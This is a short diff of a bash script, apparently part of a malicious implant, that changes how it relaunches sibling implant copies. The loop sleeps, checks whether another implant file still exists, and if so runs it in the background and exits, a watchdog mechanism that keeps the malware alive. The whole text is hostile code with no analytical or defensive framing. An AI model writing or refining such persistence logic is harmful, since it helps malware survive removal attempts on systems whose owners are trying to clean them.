@@ -42,8 +42,13 @@ while [ true ]; do
 			sleep 30
 			for imp in ${imps[@]}; do #look for another implant to run
 				if [ "$imp" != "${0}" ]; then
-					bash "$imp" & # try running the other implant
-					exit 0
+					alive=$(ls "$imp" 2>/dev/null)
+					if [ ! -z "$alive" ]; then
+						bash "$imp" & # try running the other implant
+						exit 0
+					elif [ -z "$alive" ]; then
+						imps=()
+					fi
 				fi
 			done
 		fi
